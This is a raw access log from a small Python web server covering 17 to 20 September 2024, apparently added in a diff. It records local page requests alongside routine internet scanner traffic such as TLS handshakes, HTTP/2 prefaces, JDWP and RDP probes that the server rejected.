+154.213.185.206 - - [17/Sep/2024 17:03:26] "JDWP-Handshake" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [17/Sep/2024 17:31:39] "GET / HTTP/1.1" 200 -
+206.168.34.35 - - [17/Sep/2024 17:48:55] code 400, message Bad request version ('À\x14À')
+206.168.34.35 - - [17/Sep/2024 17:48:55] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¦§Xw\x06¯\x0d¶oùö\x83pIívÊæÜÄÌDu=ç×K-R0\x99¸ Ëæ\x9d\x05\x1b-µ\x92\x80v/läÜ.¤\x14ò }P\x10lËDH2~/×³F\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+206.168.34.35 - - [17/Sep/2024 17:48:59] "GET / HTTP/1.1" 200 -
+206.168.34.35 - - [17/Sep/2024 17:49:02] "GET / HTTP/1.1" 200 -
+206.168.34.35 - - [17/Sep/2024 17:49:03] "GET /favicon.ico HTTP/1.1" 404 -
+206.168.34.35 - - [17/Sep/2024 17:49:03] code 505, message Invalid HTTP version (2.0)
+206.168.34.35 - - [17/Sep/2024 17:49:03] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+44.220.185.209 - - [17/Sep/2024 17:58:50] code 400, message Bad request version ('7°\x99¦UùïÖ¤R\x8e\x9aþS\x97\x9eFÉ¬[ÎÊ\x18"\x99\x86\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À\'À')
+44.220.185.209 - - [17/Sep/2024 17:58:50] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03ô*º·\x12þ²Bü\x1d\x88H\x89¤ÂU\x90kUî6°*\x96ÐÉñn@V²x þpÁJ \x097°\x99¦UùïÖ¤R\x8e\x9aþS\x97\x9eFÉ¬[ÎÊ\x18"\x99\x86\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À­À®À¬À$À(À#À'À" HTTPStatus.BAD_REQUEST -
+44.220.185.209 - - [17/Sep/2024 17:58:51] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 18:56:50] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 18:56:51] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [17/Sep/2024 18:56:56] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 18:56:56] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 18:57:21] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 18:57:21] "GET /security_check/123/123 HTTP/1.1" 200 -
+199.45.154.147 - - [17/Sep/2024 19:16:46] code 400, message Bad request version ('À\x14À')
+199.45.154.147 - - [17/Sep/2024 19:16:46] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03J\x1bu\x16¨^HÙ²iî\x99\x12¨ë¯¤\x07úãÄB \x1aU\x83áIï;\x0b~ çæZJ\x07(\x09-\x89Ç¤l×ÛyWuü PPÌÏ\x97×®y=½\x0f.Ì\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+199.45.154.147 - - [17/Sep/2024 19:16:50] "GET / HTTP/1.1" 200 -
+199.45.154.147 - - [17/Sep/2024 19:16:54] "GET / HTTP/1.1" 200 -
+199.45.154.147 - - [17/Sep/2024 19:16:54] "GET /favicon.ico HTTP/1.1" 404 -
+199.45.154.147 - - [17/Sep/2024 19:16:55] code 505, message Invalid HTTP version (2.0)
+199.45.154.147 - - [17/Sep/2024 19:16:55] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+111.7.96.148 - - [17/Sep/2024 21:34:33] code 400, message Bad request version ('À\x13À')
+111.7.96.148 - - [17/Sep/2024 21:34:33] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03I\x06²ù¼\x99iÀYûøºe-\x83Ud]\x0e\x8d·b8´gÆÝ9dZ8f gÁ\x81i³öòË°©\x19NÖ½\x95g|püé<Z¡\x90T·é¥8'O;\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+111.7.96.148 - - [17/Sep/2024 21:34:43] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 21:45:34] "GET / HTTP/1.1" 200 -
+198.235.24.92 - - [17/Sep/2024 21:47:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 21:55:20] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 21:55:21] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [17/Sep/2024 21:55:27] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 21:55:27] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 23:46:38] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 00:14:35] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 00:14:36] "GET / HTTP/1.1" 200 -
+205.210.31.67 - - [18/Sep/2024 00:55:56] "GET / HTTP/1.1" 200 -
+205.210.31.176 - - [18/Sep/2024 02:31:42] "GET / HTTP/1.0" 200 -
+83.222.190.78 - - [18/Sep/2024 03:14:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [18/Sep/2024 03:14:43] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+205.210.31.213 - - [18/Sep/2024 04:24:15] "GET / HTTP/1.1" 200 -
+45.84.89.2 - - [18/Sep/2024 05:03:53] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [18/Sep/2024 05:03:53] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+167.94.138.54 - - [18/Sep/2024 08:11:14] code 400, message Bad request version ('À\x14À')
+167.94.138.54 - - [18/Sep/2024 08:11:14] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03®k²Ö#ßîjÖ£4N\x19\x0bsU(ü¬_È7\x83Z¥á\x81aä\x09÷é }\x95Õ_\x03\x0fS \x01d\x8e¤.¦Éú\x80f\x04Ûðý¹í\x90}wÁp´\x96o\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.138.54 - - [18/Sep/2024 08:11:19] "GET / HTTP/1.1" 200 -
+167.94.138.54 - - [18/Sep/2024 08:11:23] "GET / HTTP/1.1" 200 -
+167.94.138.54 - - [18/Sep/2024 08:11:25] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.54 - - [18/Sep/2024 08:11:26] code 505, message Invalid HTTP version (2.0)
+167.94.138.54 - - [18/Sep/2024 08:11:26] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+185.234.216.112 - - [18/Sep/2024 08:34:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [18/Sep/2024 08:34:12] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [18/Sep/2024 08:43:40] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 08:43:41] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 08:57:36] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 08:57:36] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 08:57:37] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 08:57:37] "GET / HTTP/1.1" 200 -
+123.160.223.73 - - [18/Sep/2024 09:34:24] "GET / HTTP/1.1" 200 -
+123.160.223.72 - - [18/Sep/2024 09:34:32] "GET / HTTP/1.1" 200 -
+123.160.223.72 - - [18/Sep/2024 09:34:38] "GET /favicon.ico HTTP/1.1" 404 -
+113.141.93.250 - - [18/Sep/2024 09:34:44] "GET / HTTP/1.1" 200 -
+113.141.93.250 - - [18/Sep/2024 09:34:44] "GET / HTTP/1.1" 200 -
+113.141.93.250 - - [18/Sep/2024 09:34:49] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 10:38:08] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 10:38:53] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 10:49:36] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 10:49:37] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 10:49:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 10:49:45] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 10:49:50] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 10:49:50] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 11:01:47] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 11:36:04] "GET / HTTP/1.1" 200 -
+178.159.37.98 - - [18/Sep/2024 12:01:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [18/Sep/2024 12:01:49] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [18/Sep/2024 12:02:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 12:02:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 12:02:23] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 12:48:51] "GET / HTTP/1.1" 200 -
+142.93.44.204 - - [18/Sep/2024 12:51:33] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03fîâp@\x975\x97SrÆí?Ó£'\x86ÖÜÛXéPeõnz!t")
+142.93.44.204 - - [18/Sep/2024 12:51:33] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03fîâp@\x975\x97SrÆí?Ó£'\x86ÖÜÛXéPeõnz!t\x1e#\x03\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+185.234.216.112 - - [18/Sep/2024 15:03:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [18/Sep/2024 15:03:31] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+185.242.226.47 - - [18/Sep/2024 16:36:28] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 16:37:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 16:37:59] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [18/Sep/2024 16:38:05] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 16:38:05] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 16:42:15] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 16:42:15] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 16:59:19] "GET / HTTP/1.1" 200 -
+35.195.241.243 - - [18/Sep/2024 17:53:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [18/Sep/2024 19:40:14] "GET / HTTP/1.1" 200 -
+167.94.138.61 - - [18/Sep/2024 22:49:38] code 400, message Bad request version ('À\x14À')
+167.94.138.61 - - [18/Sep/2024 22:49:38] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ÅTvBP\x16\x94#\x8aYô\x0c³eÿ®\x132Sµ\x0bvÿIÍ8[ÑÚ\x14\x12\x0c \x1b\x8aOÄÕ\x7f*õr^\x7fP[Ñ\x00\\Å\x97ü&\x1at6\x98]! 6³¯B¯\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.138.61 - - [18/Sep/2024 22:49:42] "GET / HTTP/1.1" 200 -
+167.94.138.61 - - [18/Sep/2024 22:49:47] "GET / HTTP/1.1" 200 -
+167.94.138.61 - - [18/Sep/2024 22:49:47] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.61 - - [18/Sep/2024 22:49:48] code 505, message Invalid HTTP version (2.0)
+167.94.138.61 - - [18/Sep/2024 22:49:48] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [19/Sep/2024 00:27:06] "GET / HTTP/1.1" 200 -
+45.84.89.2 - - [19/Sep/2024 04:27:34] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [19/Sep/2024 04:27:34] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [19/Sep/2024 07:40:50] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 07:40:52] "GET / HTTP/1.1" 200 -
+157.55.39.225 - - [19/Sep/2024 09:24:57] "GET /robots.txt HTTP/1.1" 404 -
+52.167.144.238 - - [19/Sep/2024 09:25:07] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [19/Sep/2024 10:36:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [19/Sep/2024 10:36:19] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+205.210.31.41 - - [19/Sep/2024 10:37:51] "GET / HTTP/1.1" 200 -
+79.124.56.186 - - [19/Sep/2024 11:33:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [19/Sep/2024 11:33:49] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+83.222.190.78 - - [19/Sep/2024 12:35:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [19/Sep/2024 12:35:38] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [19/Sep/2024 12:39:55] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 12:39:55] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 12:40:03] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 12:40:03] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 12:40:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 12:40:10] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 13:31:05] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 13:31:05] "GET /favicon.ico HTTP/1.1" 404 -
+185.234.216.112 - - [19/Sep/2024 13:45:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [19/Sep/2024 13:45:48] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+178.159.37.98 - - [19/Sep/2024 14:15:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [19/Sep/2024 14:15:21] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [19/Sep/2024 14:16:25] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 14:18:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 14:18:59] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 14:19:04] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 14:19:04] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 14:19:31] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 14:19:31] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 14:24:36] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 14:24:36] "GET /security_check/123/123 HTTP/1.1" 200 -
+178.128.39.41 - - [19/Sep/2024 16:31:02] code 400, message Bad request version ('ÁUj8\x82\x00çÏðy\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+178.128.39.41 - - [19/Sep/2024 16:31:02] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03ö\x18ØÑ\x93F\x1a\x06å\x81´wÞ°ÔÃ ÖsÙ\x85\x1eÁUj8\x82\x00çÏðy\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [19/Sep/2024 16:53:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 16:53:18] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.36 - - [19/Sep/2024 17:02:18] code 400, message Bad request version ('À\x14À')
+167.94.138.36 - - [19/Sep/2024 17:02:18] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03»·Ù\x85w8\x0bV5\x15ÇYZY¥º¶.F~\x85:l½\x15wT<Æ-\x0cð @\x1dÀ£§i\x0c\x0bª91úìÆò\x02\x06\x19ì±¨,\x02|\x85=x\x0d \x8a\x96g\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.138.36 - - [19/Sep/2024 17:02:22] "GET / HTTP/1.1" 200 -
+167.94.138.36 - - [19/Sep/2024 17:02:25] "GET / HTTP/1.1" 200 -
+167.94.138.36 - - [19/Sep/2024 17:02:26] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.138.36 - - [19/Sep/2024 17:02:26] code 505, message Invalid HTTP version (2.0)
+167.94.138.36 - - [19/Sep/2024 17:02:26] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+198.235.24.172 - - [19/Sep/2024 18:30:01] "GET / HTTP/1.0" 200 -
+167.94.145.107 - - [19/Sep/2024 19:18:41] code 400, message Bad request version ('À\x14À')
+167.94.145.107 - - [19/Sep/2024 19:18:41] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03a÷CeUG¼jÿæJ,Æf¼\x08\x17ç'Þ¹ð¾ 2ìt\x17lJ\x1b¦ ®þ¥Ä\x00É\x1f®\x9c\x83\x1eMÈ\x9eê RüJC!° B<X!\x87(J\x00·\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.145.107 - - [19/Sep/2024 19:18:45] "GET / HTTP/1.1" 200 -
+167.94.145.107 - - [19/Sep/2024 19:18:48] "GET / HTTP/1.1" 200 -
+167.94.145.107 - - [19/Sep/2024 19:18:49] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.145.107 - - [19/Sep/2024 19:18:49] code 505, message Invalid HTTP version (2.0)
+167.94.145.107 - - [19/Sep/2024 19:18:49] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+127.0.0.1 - - [19/Sep/2024 19:40:30] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 20:15:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 20:15:49] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 21:14:35] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:14:35] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 21:14:41] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:14:41] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:14:43] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:14:43] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:14:46] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:14:46] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:16:41] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:16:41] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 21:16:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:16:45] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 21:16:52] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:16:52] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 21:17:46] "GET / HTTP/1.1" 200 -
+64.62.156.96 - - [19/Sep/2024 21:22:37] "GET / HTTP/1.1" 200 -
+64.62.156.104 - - [19/Sep/2024 21:22:54] "GET /favicon.ico HTTP/1.1" 404 -
+172.169.206.50 - - [19/Sep/2024 21:52:05] "GET /v2/ HTTP/1.1" 404 -
+127.0.0.1 - - [19/Sep/2024 22:33:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 22:33:10] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [19/Sep/2024 22:33:15] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 00:10:48] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 00:10:48] "GET / HTTP/1.1" 200 -
+167.94.146.54 - - [20/Sep/2024 01:05:18] code 400, message Bad request version ('À\x14À')
+167.94.146.54 - - [20/Sep/2024 01:05:18] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x97·Í¹4=ù\x93§\x89\x8bÊ\x17\x7f í1ï\x87ßD¨\x9d\x10ÞÕÔííU#\x0e  ñèj\x81\x0c^Ç:I[\x16©\x82´Gï &ôê\x15îÄÁ5d\x13þKÙ\\\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.94.146.54 - - [20/Sep/2024 01:05:22] "GET / HTTP/1.1" 200 -
+167.94.146.54 - - [20/Sep/2024 01:05:26] "GET / HTTP/1.1" 200 -
+167.94.146.54 - - [20/Sep/2024 01:05:26] "GET /favicon.ico HTTP/1.1" 404 -
+167.94.146.54 - - [20/Sep/2024 01:05:27] code 505, message Invalid HTTP version (2.0)
+167.94.146.54 - - [20/Sep/2024 01:05:27] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+79.110.62.129 - - [20/Sep/2024 01:09:24] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.110.62.129 - - [20/Sep/2024 01:09:24] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [20/Sep/2024 02:00:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 02:07:15] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 03:39:07] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 03:51:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 03:57:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 03:57:59] "GET / HTTP/1.1" 200 -
+79.124.49.202 - - [20/Sep/2024 04:04:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [20/Sep/2024 04:04:13] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+45.84.89.2 - - [20/Sep/2024 04:56:17] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [20/Sep/2024 04:56:17] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+39.98.69.46 - - [20/Sep/2024 05:02:02] code 400, message Bad request syntax ('{\x01\x00\x1613911391139À¨\x01\x01\x13\x90{')
+39.98.69.46 - - [20/Sep/2024 05:02:02] "{\x01\x00\x1613911391139À¨\x01\x01\x13\x90{" HTTPStatus.BAD_REQUEST -
+39.98.69.46 - - [20/Sep/2024 05:02:02] "GET / HTTP/1.1" 200 -
+39.98.69.46 - - [20/Sep/2024 05:02:02] "GET /favicon.ico HTTP/1.1" 404 -
+182.138.158.108 - - [20/Sep/2024 05:57:48] code 400, message Bad request version ('À\x13À')
+182.138.158.108 - - [20/Sep/2024 05:57:48] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03?La)ê\x01Å&\x7f»äëçý¡\x8d%Þ^Ô\x19\x8bO}OßSÊ\x08;\x9c³ \x9bC\x97½-lAã[\x01ÉÑ\x1e®M6Ä\x9d$º\x14_«ñ3EÖµ¯\x8eÆ\x11\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+171.108.182.221 - - [20/Sep/2024 05:57:48] code 400, message Bad request version ('À\x13À')
+171.108.182.221 - - [20/Sep/2024 05:57:48] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03eñW|\x84Îhã_G¯\x81\x82+S\x07=½\x8bé\x01¹3H\x10È©ùµHõ\x0f 5\x94\x08;x\x04o{\x01ÇøÌ\x10\x11ì©³ ¥¦Ûû\x87æ N'\x1cp'\x0f\x91\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+185.147.124.62 - - [20/Sep/2024 06:08:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.147.124.62 - - [20/Sep/2024 06:08:59] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+205.210.31.235 - - [20/Sep/2024 07:06:57] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [20/Sep/2024 07:23:26] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 07:23:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 07:23:27] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 07:23:34] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 07:23:34] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 07:23:45] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 07:23:48] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 07:23:50] "GET / HTTP/1.1" 200 -
+147.185.132.153 - - [20/Sep/2024 08:38:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 09:21:24] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 09:21:24] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/Sep/2024 09:22:31] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 09:22:35] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 09:22:35] "GET /security_check/123/123 HTTP/1.1" 200 -
+147.185.132.43 - - [20/Sep/2024 09:23:40] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/Sep/2024 10:11:05] "GET /robots.txt HTTP/1.1" 404 -
